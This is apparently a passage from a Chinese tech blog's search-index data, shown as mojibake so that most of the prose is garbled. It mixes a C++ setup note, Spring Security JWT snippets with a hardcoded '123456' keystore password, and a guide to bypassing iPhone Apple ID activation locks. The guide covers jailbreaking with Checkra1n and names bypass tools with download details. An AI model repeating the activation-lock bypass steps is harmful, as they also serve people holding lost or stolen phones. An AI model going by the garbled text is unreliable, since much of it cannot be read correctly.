æ­¥éª¤äºŒé€‰æ‹© C++ çš„ â€œç©ºé¡¹ç›®â€ï¼Œè‹¥æ²¡æœ‰æ‰¾åˆ° â€œç©ºé¡¹ç›®â€ï¼Œåœ¨è¯­è¨€ä¸‹æ‹‰åˆ—è¡¨é‡Œé€‰æ‹© â€œC++â€ å³å¯ æ­¥éª¤ä¸‰è¾“å…¥é¡¹ç›®åï¼Œæ›´æ”¹é¡¹ç›®çš„å­˜æ”¾è·¯å¾„ æ­¥éª¤å››æ–°å»º C++ çš„æºæ–‡ä»¶ æ­¥éª¤äº”ç¼–å†™ C++ ä»£ç  123456789#include &lt;iostream&gt;#include &lt;stdlib.h&gt;using namespace std;int main() { cout &lt;&lt; "Hello World" &lt;&lt; endl; system("pause");} æ­¥éª¤å…­ç¼–è¯‘è¿è¡Œ C++ ä»£ç  var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘å·¥å…·"},{title:"Docker-K8S é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/3b82844a.html",text:'var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"iPhone ç ´è§£å±å¹•é”ã€åœç”¨é”ã€ä¸¢å¤±é”ã€ID é”æ•™ç¨‹",url:"/posts/9ab7ecb5.html",text:'å‰è¨€æœ¬æ–‡ä¸»è¦ä»‹ç» iPhone å¦‚ä½•ç ´è§£å±å¹•é”ã€åœç”¨é”ã€ä¸¢å¤±é”ã€ID é”ï¼Œç”±äºç¯‡å¹…æœ‰é™ï¼Œä¸‹é¢åªä¼šç»™å‡ºæ ¸å¿ƒè¯´æ˜ã€è½¯ä»¶ä¸‹è½½é“¾æ¥ä¸è§†é¢‘æ•™ç¨‹é“¾æ¥ç­‰ï¼Œæ¯•ç«Ÿç½‘ä¸Šæœ‰å¾ˆå¤šå¯ä»¥å‚è€ƒçš„èµ„æ–™ã€‚å…¶ä¸­ç ´è§£ ID é”å¸¸è§æœ‰ä¸‰ç§æ–¹å¼ï¼ŒåŒ…æ‹¬ç»•è¿‡ IDï¼ˆè·³è¿‡ ID é”ç™»å½•ï¼‰ã€éšè— IDï¼ˆå°† ID é”éšè—èµ·æ¥ï¼‰ã€åˆ é™¤ IDï¼ˆå°† ID é”åˆ é™¤æ‰ï¼‰ï¼Œä¸ºäº†æè¿°æ–¹ä¾¿ä¸‹æ–‡ç»Ÿä¸€ç®€è¿°ä¸ºç ´è§£ ID é”ã€‚ä¸‹æ–‡æ˜¯ç¬”è€…äº²èº«å®è·µçš„æ€»ç»“å†…å®¹ï¼Œ2020 å¹´ 8 æœˆæˆåŠŸè§£é”äº† iPhone 6SPï¼ˆiOS 12ï¼‰ã€iPhone 8ï¼ˆiOS 13ï¼‰ çš„ ID é”ã€‚éšç€æ—¶é—´çš„æ¨ç§»ï¼Œç¬”è€…ä¸èƒ½ä¿è¯æœ¬æ–‡å†…å®¹ï¼ˆè§†é¢‘æ•™ç¨‹ã€è½¯ä»¶å·¥å…·ç­‰ï¼‰å¯ä»¥é•¿æœŸç”Ÿæ•ˆï¼Œæ¯•ç«Ÿ iOS 14 å·²ç»å‘å¸ƒäº†ï¼›è€Œä¸”ç ´è§£ iPhone å„ç§é”æœ¬æ¥å°±æ˜¯æ”»é˜²ä¹‹é—´çš„è¾ƒé‡ï¼Œç ´è§£æŠ€æœ¯ä¸€ç›´åœ¨ä¸æ–­åœ°è¿›æ­¥ï¼Œè‹¹æœçš„å®‰å…¨æŠ€æœ¯ä¹ŸåŒæ ·ä¸æ–­åœ¨å®Œå–„ã€‚ å„ç§é”ä»‹ç» ä¸¢å¤±é”è¢«å¤±ä¸»æ¿€æ´»ï¼Œåˆ·æœºå³å¯è§£å†³ å±å¹•é”çš„å¯†ç å¿˜è®°äº†ï¼Œåˆ·æœºå³å¯è§£å†³ å¤šæ¬¡è¾“å‡ºé”™è¯¯çš„å±å¹•é”å¯†ç ï¼Œå¯¼è‡´ iPhone æ¿€æ´»äº†åœç”¨é”ï¼Œåˆ·æœºå³å¯è§£å†³ IOS ç³»ç»Ÿå¼€å¯äº† æŸ¥æ‰¾æˆ‘çš„ iPhone åŠŸèƒ½åï¼Œå³ä½¿ ID é”è¢«æ¿€æ´»äº†ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸‰ç§æ–¹æ³•ç ´è§£ ID é”ï¼š æ–¹æ³•ä¸€ã€åˆ·æœº + è¶Šç‹± + æ¿€æ´» æ–¹æ³•äºŒã€è¶Šç‹± + å¤‡ä»½æ¿€æ´»å‡­è¯ + åˆ·æœº + è¶Šç‹± + æ¿€æ´» + è¿˜åŸæ¿€æ´»å‡­è¯ æ–¹æ³•ä¸‰ã€è¶Šç‹± + å…³é—­ æŸ¥æ‰¾æˆ‘çš„ iPhone çš„åŠŸèƒ½ï¼ˆä¸€èˆ¬åŒ…å«äº†æ¿€æ´»å‡­è¯çš„å¤‡ä»½ä¸è¿˜åŸï¼‰ + åˆ·æœºï¼Œæ­¤æ–¹æ³•æš‚æ—¶åªé€‚ç”¨äº IOS 13+ çš„ç³»ç»Ÿï¼ˆä¸åŒ…æ‹¬ä»ä½ç‰ˆæœ¬å‡çº§åˆ° IOS 13+ çš„æƒ…å†µï¼‰ ç‰¹åˆ«æ³¨æ„äº‹é¡¹ï¼š å»ºè®®æ— è®ºæ˜¯ä½¿ç”¨å“ªç§æ–¹æ³•ç ´è§£ ID é”ï¼Œä¸ºäº†ä»¥é˜²ä¸‡ä¸€ï¼Œéƒ½å»ºè®®å…ˆè¶Šç‹±å¹¶å¤‡ä»½æ¿€æ´»å‡­è¯ å¦‚æœå®åœ¨æ— æ³•å¤‡ä»½æ¿€æ´»å‡­è¯ï¼ˆä¾‹å¦‚è¶Šç‹±å¤±è´¥ï¼‰ï¼Œæ­¤æ—¶è‹¥é‡‡ç”¨ä¸Šé¢çš„æ–¹æ³•ä¸€ç ´è§£ ID é”åï¼Œä¸‰ç½‘çš„æœºå­ï¼ˆä¸¤ç½‘é™¤å¤–ï¼‰åªèƒ½å½“æ¸¸æˆæœºç”¨äº†ï¼Œæ— æ³•æ­£å¸¸ä½¿ç”¨ Sim å¡çš„æ‰“ç”µè¯å’Œ 4G ç½‘ç»œç­‰åŠŸèƒ½ï¼ï¼ï¼ å¦‚æœ IOS ç³»ç»Ÿå¼€å¯äº† æŸ¥æ‰¾æˆ‘çš„ iPhone åŠŸèƒ½ï¼ˆID é”è¢«æ¿€æ´»ï¼‰ï¼Œé‚£ä¹ˆåŸç³»ç»Ÿéƒ½å¿…é¡»å…ˆè¶Šç‹±ï¼Œç„¶åå¤‡ä»½åŸç³»ç»Ÿçš„æ¿€æ´»å‡­è¯ï¼Œå†æ‰§è¡Œå…¶ä»–æ“ä½œï¼Œå¦åˆ™ä¸€æ—¦åˆ·æœºæˆ–å‡çº§ç³»ç»Ÿåï¼Œä¸‰ç½‘çš„æœºå­ï¼ˆä¸¤ç½‘é™¤å¤–ï¼‰å³ä½¿æ¿€æ´»äº†ç³»ç»Ÿä¹Ÿæ— æ³•æ­£å¸¸ä½¿ç”¨ Sim å¡çš„æ‰“ç”µè¯å’Œ 4G ç½‘ç»œç­‰åŠŸèƒ½ï¼Œåˆ‡è®°ï¼ï¼ï¼ å„ç§é”ç ´è§£åçš„åŠŸèƒ½ä»‹ç»1ã€å±å¹•é”ã€åœç”¨é”ã€ä¸¢å¤±é”ç ´è§£åçš„åŠŸèƒ½è¯´æ˜å¦‚ä¸‹ï¼š å®Œç¾å…¨åŠŸèƒ½ï¼Œç ´è§£åç­‰äºæ²¡æœ‰ ID é”ï¼Œç›¸å½“äºå®˜è§£ 2ã€ä¸¤ç½‘ç‰ˆæœºå­ç ´è§£ ID é”åçš„åŠŸèƒ½è¯´æ˜å¦‚ä¸‹ï¼š Siri iCloud äº‘åŒæ­¥ é‡å¯ / å…³æœº æ‰“ç”µè¯ / 4G ä¸Šç½‘ é€šçŸ¥æ¨é€ ç ´è§£ç½‘ç»œé” ç³»ç»Ÿå‡çº§è¿˜åŸæŠ¹é™¤ 3ã€ä¸‰ç½‘ç‰ˆæœºå­ç ´è§£ ID é”åçš„åŠŸèƒ½è¯´æ˜å¦‚ä¸‹ï¼š Siri iCloud äº‘åŒæ­¥ é‡å¯ / å…³æœº é€šçŸ¥æ¨é€ ç ´è§£ç½‘ç»œé” æ‰“ç”µè¯ / 4G ä¸Šç½‘ ç³»ç»Ÿå‡çº§è¿˜åŸæŠ¹é™¤ è¶Šç‹±Checkra1n è¶Šç‹±å·¥å…·Checkra1n æ˜¯ä¸€æ¬¾é€‚ç”¨äº iPhone 5s ~ iPhone Xï¼ˆA7 - A11 å¤„ç†å™¨ï¼‰ï¼Œä¸” iOS ç³»ç»Ÿç‰ˆæœ¬ä¸º 12.3+ çš„è¶Šç‹±å·¥å…·ï¼Œæ”¯æŒè¿è¡Œåœ¨ Macã€Linux ç³»ç»Ÿï¼Œæš‚æ—¶ä¸æ”¯æŒ Windows ç³»ç»Ÿã€‚æ™®é€šçš„å®¶ç”¨ç”µè„‘ï¼ˆWindows ç³»ç»Ÿï¼‰å¯ä»¥ä½¿ç”¨ Checkra1n é•œåƒåˆ¶ä½œ Linux Live U ç›˜ï¼Œç„¶ååœ¨ BIOS é‡Œè®¾ç½®ä» U ç›˜å¯åŠ¨ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç”¨ Linux ç³»ç»Ÿé‡Œçš„ Checkra1n å·¥å…·äº†ã€‚Checkra1n 0.10.2 ç‰ˆæœ¬çš„é•œåƒå¯ä»¥ä»è¿™é‡Œä¸‹è½½ï¼Œè¯¥é•œåƒçš„åŸåœ°å€å’Œä½¿ç”¨æ•™ç¨‹åœ¨è¿™é‡Œï¼Œæ”¯æŒ U ç›˜å’Œç¡¬ç›˜å¯åŠ¨ï¼Œç¡¬ç›˜å¯åŠ¨æ•™ç¨‹å¯ä»¥å‚è€ƒåšå®¢ã€‚å¦‚æœéœ€è¦å…¶ä»–ç‰ˆæœ¬çš„ Checkra1n Linux é•œåƒï¼Œå¯ä»ç™¾åº¦ç½‘ç›˜ä¸‹è½½ï¼Œæå–ç ä¸º ersoï¼Œå…·ä½“çš„ä½¿ç”¨æ•™ç¨‹å¯ä»¥çœ‹è¿™é‡Œï¼ŒCheckra1n ä¸ IOS ç³»ç»Ÿçš„ç‰ˆæœ¬å¯¹åº”å…³ç³»å¦‚ä¸‹ï¼š Checkra1n 0.9.8 é€‚ç”¨ IOS 12.3 ~ IOS 13.3.1 Checkra1n 0.9.8.1 é€‚ç”¨ IOS 12.3 ~ IOS 13.3.1 Checkra1n 0.9.8.2 é€‚ç”¨ IOS 12.3 ~ IOS 13.3.1 Checkra1n 0.10.1 é€‚ç”¨ IOS 12.3 ~ IOS 13.4.1 Checkra1n 0.10.2 é€‚ç”¨ IOS 12.3 ~ IOS 13.5 Checkra1n è¶Šç‹±è§†é¢‘æ•™ç¨‹ Checkra1n U ç›˜è¶Šç‹± iOS 13.6 Checkra1n U ç›˜è¶Šç‹± Checkra1n Liunx U ç›˜ iOS 13 è¶Šç‹± Checkra1n è¶Šç‹± 0.9.8~0.1.0.2 å…±å­˜ç‰ˆ Checkra1n è¶Šç‹±é”™è¯¯ç æ±‡æ€»Checkra1n å®˜æ–¹ issues å¯ä»¥çœ‹è¿™é‡Œï¼Œä¸­æ–‡ç‰ˆçš„è¶Šç‹±é”™è¯¯æ±‡æ€»å¯ä»¥çœ‹è¿™é‡Œï¼Œå¸¸è§çš„é”™è¯¯å¦‚ä¸‹ï¼š -26 æˆ–è€… -31 é”™è¯¯ç  ä¸æ”¯æŒåœ¨è™šæ‹Ÿæœºå†…ï¼ˆVMware/VBoxï¼‰è¿è¡Œ Checkra1n è¶Šç‹±å·¥å…· -77 é”™è¯¯ç  è§£å¼€é”å± /iPhone åœç”¨ç•Œé¢åï¼Œè¿›å…¥ç³»ç»Ÿç•Œé¢å†è¶Šç‹±ï¼Œè¿™ç§é”™è¯¯ä¸€èˆ¬åœ¨ä½¿ç”¨ Checkra1n Linux é•œåƒï¼ˆU ç›˜ç‰ˆï¼‰æ—¶ä¼šå‡ºç° è‹¥é”å± /iPhone åœç”¨ç•Œé¢æ— æ³•è§£å¼€ï¼Œå¯ä»¥ç‰©ç†å®‰è£… Ubuntu ç³»ç»Ÿæˆ–è€…ä½¿ç”¨ Ubuntu Live ç›˜ï¼Œåœ¨ Ubuntu ç³»ç»Ÿé‡Œé€šè¿‡ apt-get å®‰è£… Checkra1nï¼ˆå¿…é¡»æå‰æ‰§è¡Œ apt-get upgrade å‘½ä»¤ï¼Œå¦åˆ™å®‰è£…ä¼šå‡ºç°ä¾èµ–é—®é¢˜ï¼‰ï¼Œæˆ–è€…åœ¨ Checkra1n å®˜ç½‘ä¸‹è½½ç¼–è¯‘å¥½çš„å¯æ‰§è¡Œæ–‡ä»¶æ¥å®‰è£…ï¼Œå®‰è£…å®Œæˆåæ‰§è¡Œè¶Šç‹±æ“ä½œå³å¯ (adsbygoogle = window.adsbygoogle || []).push({}); ç ´è§£ ID é”ç ´è§£ ID é”è§†é¢‘æ•™ç¨‹ä»¥ä¸‹è§†é¢‘æ¥æº Youtube å¹³å°ï¼Œè¯·è‡ªå¤‡æ¢¯å­ï¼Œå¦åˆ™æ— æ³•æ­£å¸¸æ‰“å¼€ã€‚ è‹¹æœæ‰‹æœºè§£é” - åˆ é™¤ - æŸ¥æ‰¾æˆ‘çš„ iPhoneï¼ˆå…è´¹ï¼‰éšæ„åˆ·æœºï¼Œæ°¸ä¹…æˆä¸ºä½ è‡ªå·±çš„æœºå™¨ åœç”¨çš„è‹¹æœ iPhone æ‰‹æœº ID å¯†ç å¿˜äº†ï¼Œå®Œç¾ç»•è¿‡ ID å¯ä»¥æ‰“ç”µè¯ä¸Šç½‘ 4G ä¸€åˆ‡æ­£å¸¸ ä¸€ä¸ª U ç›˜å°±å¯ä»¥ç»•è¿‡è‹¹æœ Icloud æ¿€æ´»é” A7-A11 æ‰€æœ‰è®¾å¤‡ iPhone and ipad bypass icloud è‹¹æœè¶Šç‹± - è·³è¿‡ ID æ¿€æ´»é” - ç›´æ¥æ’ Sim å¡å°±å¯ä»¥æ‰“ç”µè¯äº† - 2020 å¹´ 4 æœˆ 26 æ—¥ FREE CELLULAR FIX for Passcode Locked &amp; Di è‹¹æœè¶Šç‹± - è·³è¿‡ ID æ¿€æ´»é” - ç›´æ¥æ’ SIM å¡å°±å¯ä»¥æ‰“ç”µè¯äº†ï¼ˆWindows ç‰ˆè¯´æ˜ï¼‰FREE CELLULAR FIX for Passcode Locked &amp; D iCLoud Bypass iOS 12.3-13.6 Sim Card Fix Call And Internet In Window Real Full Untethered Bypass iCloud on iPhone &amp; iPad iOS 12.4.8 - iOS 13.6.1 | Windows Tutorial è¿è¡Œå¹³å° ä¸€ã€Mac å¹³å°å…¨æå®š äºŒã€ Linux å¹³å°å…¨æå®šï¼ˆDebianã€Ubuntuï¼‰ ä¸‰ã€æ··åˆå¹³å°ï¼Œå¯ä»»æ„ç»„åˆä½¿ç”¨ï¼Œç»„åˆæ¡ˆä¾‹å¦‚ä¸‹ åˆ·æœºï¼šWindows ç³»ç»Ÿ + çˆ±æ€åŠ©æ‰‹ è¶Šç‹±ï¼šU ç›˜ + Checkra1n Linux é•œåƒ ç ´è§£ ID é”ï¼šWindows ç³»ç»Ÿ + iFRPFILE å¤‡ä»½ä¸è¿˜åŸæ¿€æ´»å‡­è¯ï¼šWindows ç³»ç»Ÿ + Sliver å·¥å…·è½¯ä»¶ç ´è§£ ID é” Sliverï¼šæ¿€æ´»å‡­è¯å¤‡ä»½ä¸è¿˜åŸ iFRPFILEï¼šç³»ç»Ÿæ¿€æ´»å·¥å…·ï¼ˆç ´è§£ ID é”ï¼‰ iCloud Bypassï¼šç³»ç»Ÿæ¿€æ´»å·¥å…·ï¼ˆç ´è§£ ID é”ï¼‰ X-Activatorï¼šé›†æˆäº†è¶Šç‹±ã€ç ´è§£ ID é”ã€ä¿®å¤æ¨é€ç­‰åŠŸèƒ½ï¼Œè¯¥è½¯ä»¶æ”¶è´¹ å„ç§è½¯ä»¶ä¸‹è½½è¯·è‡ªå¤‡æ¢¯å­ï¼Œå¦åˆ™ä»¥ä¸‹è½¯ä»¶å¯èƒ½ä¼šä¸‹è½½å¤±è´¥ï¼ŒåŒæ—¶éšç€æ—¶é—´çš„æ¨ç§»ï¼Œå·¥å…·å¯èƒ½ä¼šå¤±æ•ˆã€‚ Checkra1n è¶Šç‹±å·¥å…·ï¼šä¸‹è½½åœ°å€ iCloud Bypass Windows ç‰ˆï¼šä¸‹è½½åœ°å€ Checkra1n Linux é•œåƒï¼šä¸‹è½½åœ°å€ï¼Œæå–ç ï¼šerso Sliver Windows ç‰ˆï¼šä¸‹è½½åœ°å€ï¼Œè§£å‹å¯†ç ï¼šhttps://t.me/itlj8 Sliver Mac ç‰ˆï¼šä¸‹è½½åœ°å€ï¼Œè®¿é—®å¯†ç ï¼šitlj8ï¼Œè§£å‹å¯†ç ï¼šhttps://t.me/itlj8 åŠŸèƒ½éªŒè¯ çŸ­ä¿¡æ˜¯å¦å¯ç”¨ WiFi æ˜¯å¦å¯ç”¨ 2G/4G ç½‘ç»œæ˜¯å¦å¯ç”¨ æ˜¯å¦å¯ä»¥æ¥å¬å’Œæ‹¨æ‰“ç”µè¯ ç³»ç»Ÿæ˜¯å¦æ­£å¸¸é‡å¯å’Œå…³æœº æ˜¯å¦å¯ä»¥é€šè¿‡ APP Store å®‰è£…åº”ç”¨ é€šçŸ¥æ¨é€ã€iCloudã€iTunesã€Siri æ˜¯å¦å¯ç”¨ æŠ€å·§æ€»ç»“åˆ¤æ–­ IOS ç³»ç»Ÿçš„ç‰ˆæœ¬è‹¥å¼€æœºåæ˜¯å±å¹•é”ã€åœç”¨é”ã€ä¸¢å¤±é”ç•Œé¢ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼åŒºåˆ† IOS 12 å’Œ IOS 13 ç³»ç»Ÿï¼š é™éŸ³é”®ï¼šæŒ‰ä¸‹é™éŸ³é”®ï¼Œè‹¥éŸ³é‡å¼¹çª—å‡ºç°åœ¨å±å¹•ä¸­é—´ï¼Œé‚£å°±æ˜¯ IOS 12 ç³»ç»Ÿï¼ŒéŸ³é‡å¼¹çª—å‡ºç°åœ¨å±å¹•é¡¶éƒ¨ï¼Œé‚£å°±æ˜¯ IOS 13 ç³»ç»Ÿ æ¢å¤æ¨¡å¼ï¼šè¿›å…¥æ¢å¤æ¨¡å¼ï¼Œå¦‚æœç•Œé¢å‡ºç°äº†å½©è‰²çš„ iTunes Logoï¼ˆå¦‚å›¾ï¼‰ï¼Œé‚£å°±æ˜¯é‚£å°±æ˜¯ IOS 12 ç³»ç»Ÿï¼Œå¦‚æœæ˜¯å…¨ç™½è‰²çš„å›¾æ¡ˆï¼ˆå¦‚å›¾ï¼‰ï¼Œå°±æ˜¯ IOS 13 ç³»ç»Ÿ æŸ¥è¯¢ iPhone çš„ç¡¬ä»¶é…ç½®åœ¨å¾—çŸ¥ IMEI ç çš„å‰æä¸‹ï¼Œå¯ä»¥é€šè¿‡ IMEI ç æŸ¥è¯¢ iPhone å…·ä½“çš„ç¡¬ä»¶é…ç½®ä¿¡æ¯ï¼Œä¾‹å¦‚è®¾å¤‡å‹å·ã€ç¡¬ç›˜å®¹é‡ã€é”€å”®åœ°åŒºç­‰ï¼Œç½‘ä¸Šèµ„æ–™å¾ˆå¤šï¼Œè¿™é‡Œä¸å†ç´¯è¿°ã€‚ æŸ¥è¯¢ iPhone çš„ ID é”çŠ¶æ€è‹¥å¼€æœºåæ˜¯å±å¹•é”ã€åœç”¨é”ã€ä¸¢å¤±é”ç•Œé¢ï¼Œå¯é€šè¿‡æ‰‹æœºå¡æ‰˜ä¸Šçš„ IMEI åºå·ï¼Œåˆ° imeipro ç½‘ç«™ï¼ˆè¯·è‡ªå¤‡æ¢¯å­ï¼‰æŸ¥è¯¢ iPhone çš„æ¿€æ´»é”æ˜¯å¦è¢«æ¿€æ´»ï¼ˆå³æ˜¯å¦å¼€å¯äº† â€œæŸ¥æ‰¾æˆ‘çš„ iPhoneâ€ï¼‰ï¼›å¦‚æœæ¿€æ´»é”å¤„äºå…³é—­çŠ¶æ€ï¼ˆä¸å­˜åœ¨ ID é”ï¼‰ï¼Œé‚£ä¹ˆç›´æ¥åˆ·æœºå°±èƒ½å½“æ­£å¸¸çš„ iPhone æ‰‹æœºä½¿ç”¨äº†ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ç”Ÿæ´»éšç¬”"},{title:"Spring Security + OAuth 2.0 + JWT å¼€å‘éšç¬”",url:"/posts/894ad1eb.html",text:'JWT ç­¾åä¸éªŒç­¾å…¬é’¥ä¸ç§é’¥ç”Ÿæˆä½¿ç”¨ JDK æä¾›çš„ keytool å·¥å…·ç”Ÿæˆ JKS å¯†é’¥åº“ (Java Key Store)ï¼Œè®¤è¯æˆæƒæœåŠ¡å™¨ä¼šä½¿ç”¨ç§é’¥å¯¹ Token è¿›è¡Œç­¾åï¼Œä¸€èˆ¬å°†ç”Ÿæˆçš„ shop.jks æ–‡ä»¶æ”¾åœ¨ resources ç›®å½•ä¸‹ 1keytool -genkey -alias shop -keyalg RSA -keypass 123456 -keystore shop.jks -storepass 123456 æ ¹æ®ç§é’¥ç”Ÿæˆå…¬é’¥ï¼Œå°†å…¶ä¿å­˜åœ¨ public.crt æ–‡ä»¶ä¸­ï¼Œç”¨äºå¯¹ Token è¿›è¡ŒéªŒç­¾ï¼Œä¸€èˆ¬å°†å…¶æ”¾ resources ç›®å½•ä¸‹ 1keytool -list -rfc --keystore shop.jks | openssl x509 -inform pem -pubkey -noout 123456789-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtXKXj3JGNJNWVXg4+++4FtNTJre+8kHLdPLwHJJcRw4aV7oMMjI1nesyj75w/kjRZImhbNo0poEu1jj+sDO9UbLUHSy59zoDDMZTYmbkboDEpkFq3ZUhAoLtt5DtAgI8DkOK22RlSxXpcMvkeL8XziFizWf/HatSgAat/SfX+5dH3KX40piPv9kI5YVJz1GyD8xO4dN95tr0Ld7FDmdKJBPWfkM+CMlKRhYqB+sAlaQW5/L3xb3WNftucC/RhdKT8/mmgMsIBhUZOS/1iFnDKuPsEwU5xEQxK9pWX2bWsSkeOgQYJmQa6hiWBuujPUyOs4rICvniopxsW2yyPOFXZQIDAQAB-----END PUBLIC KEY----- è®¤è¯æˆæƒæœåŠ¡å™¨åŠ è½½ JKS ç§˜é’¥åº“è®¤è¯æˆæƒæœåŠ¡å™¨åŠ è½½ JKS ç§˜é’¥åº“ï¼Œä»ä¸­è·å–å¯†é’¥å¯¹ï¼ˆå…¬é’¥ + ç§é’¥ï¼‰ï¼ŒJava ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š 1234567891011/** * ä»ClassPathä¸‹çš„å¯†é’¥åº“ä¸­è·å–å¯†é’¥å¯¹ï¼ˆå…¬é’¥+ç§é’¥ï¼‰ * * @return */@Beanpublic KeyPair keyPair() { KeyStoreKeyFactory factory = new KeyStoreKeyFactory(new ClassPathResource("shop.jks"), "123456".toCharArray()); KeyPair keyPair = factory.getKeyPair("shop", "123456".toCharArray()); return keyPair;} è®¤è¯æˆæƒæœåŠ¡å™¨æš´éœ²è·å–å…¬é’¥çš„æ¥å£å¯¹å¤–æš´éœ² JWK Set URI æ¥å£ï¼Œè®©å…¶ä»–åº”ç”¨ç³»ç»Ÿå¯ä»¥è·å–åˆ°å…¬é’¥ 1234567891011121314151617181920@RestController@RequestMapping("/oauth")public class JwkSetController { @Autowired private KeyPair keyPair; /** * è·å–å…¬é’¥ * * @return */ @GetMapping("/.well-known/jwks.json") public Map&lt;String, Object&gt; publicKey() { RSAPublicKey publicKey = (RSAPublicKey) keyPair.getPublic(); RSAKey key = new RSAKey.Builder(publicKey).build(); return new JWKSet(key).toJSONObject(); }} æˆ–è€…é€šè¿‡ KeyPair æ¥è·å–å…¬é’¥ 123456789101112131415161718@RestController@RequestMapping("/oauth")public class PublicKeyController { @Autowired private KeyPair keyPair; /** * è·å–å…¬é’¥ * * @return */ @GetMapping("/publicKey") public String publicKey() { return Base64.encode(new String(keyPair.getPublic().getEncoded())); }} æˆ–è€…ç›´æ¥ä½¿ç”¨ OAuth 2.0 å†…ç½®çš„æ¥å£ /oauth/token_key æ¥è·å–å…¬é’¥ 12# ä¸‹è¿°çš„"127.0.0.1:8080"æ˜¯è®¤è¯æˆæƒæœåŠ¡å™¨çš„åœ°å€$ curl --request GET \'http://127.0.0.1:8080/oauth/token_key 1234{ "alg": "SHA256withRSA", "value": "-----BEGIN PUBLIC KEY-----\\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtXKXj3JGNJNWVXg4+++4FtNTJre+8kHLdPLwHJJcRw4aV7oMMjI1nesyj75w/kjRZImhbNo0poEu1jj+sDO9p8n5oYXn3qU8bsmqLa/vttq7Ubi4a5eaoP8ASjoD+dnQ0I7ZdpH/fiiHfriGI4tFziFizWf/HatSgAat/SfX+5dk3KX40piPv9kI5YVJz1GyD8xO4dN9dtr0Ld7FDmdKJBPWfkM+CMlKRhYqB+sAlaQW5/L3xb3WNftucC/RhdKT8/mmgMsIBhUZOS/1iFnDKaPsEwU5xEQxK9pWX2bWsSkeOgQYJmQa6hiWBuujPUyOs4rICvniopxsW2yyPOFXZQIDAQAB\\n-----END PUBLIC KEY-----"} èµ„æºæœåŠ¡å™¨æŒ‡å®šå…¬é’¥æ–‡ä»¶çš„è·¯å¾„åœ¨ YML é…ç½®é‡ŒæŒ‡å®šè®¤è¯æˆæƒæœåŠ¡å™¨æš´éœ²çš„ JWK Set URI æ¥å£ï¼Œä»¥æ­¤æ¥è·å–å…¬é’¥ï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œé»˜è®¤æƒ…å†µä¸‹ jwk-set-uri æŒ‡å®šçš„ URL æ— æ³•ä½¿ç”¨ Ribbon æ¥å®ç°è´Ÿè½½å‡è¡¡è®¿é—®ï¼ˆé™¤éåˆ©ç”¨ DNS çš„åŸŸåè§£æï¼Œå³å•ä¸ªåŸŸåç»‘å®šå¤šä¸ª IPï¼Œé€šè¿‡ DNS æœåŠ¡å™¨åšè´Ÿè½½å‡è¡¡ï¼‰ 12345678spring: application: name: gateway-server security: oauth2: resourceserver: jwt: jwk-set-uri: http://127.0.0.1:8080/oauth/.well-known/jwks.json æˆ–è€…å°†ä¸Šé¢é€šè¿‡ keytool å·¥å…·è·å–åˆ°çš„å…¬é’¥æ‹·è´åˆ° src/main/resources/public.crt æ–‡ä»¶ä¸­ï¼Œç„¶ååœ¨ YML é…ç½®é‡ŒæŒ‡å®šå…¬é’¥æ–‡ä»¶çš„è·¯å¾„ 12345678spring: application: name: gateway-server security: oauth2: resourceserver: jwt: public-key-location: classpath:public.crt (adsbygoogle = window.adsbygoogle || []).push({}); Cannot convert access token to JSON é”™è¯¯åº”ç”¨å¯åŠ¨åï¼Œå‡ºç° Cannot convert access token to JSON è¿™ä¸ªé”™è¯¯ï¼Œä¸»è¦æ˜¯ OAuth 2.0 çš„èµ„æºæœåŠ¡å™¨ç¼ºå°‘äº†åŠ è½½å…¬é’¥çš„é…ç½®ï¼Œè§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š 123456789@Beanpublic JwtAccessTokenConverter accessTokenConverter() { JwtAccessTokenConverter converter = new JwtAccessTokenConverter(); // è·å–å…¬é’¥ String publicKey = getPublicKey(); // åŠ è½½å…¬é’¥ converter.setVerifier(new RsaVerifier(publicKey)); return converter;} èµ„æºæœåŠ¡å™¨åŠ 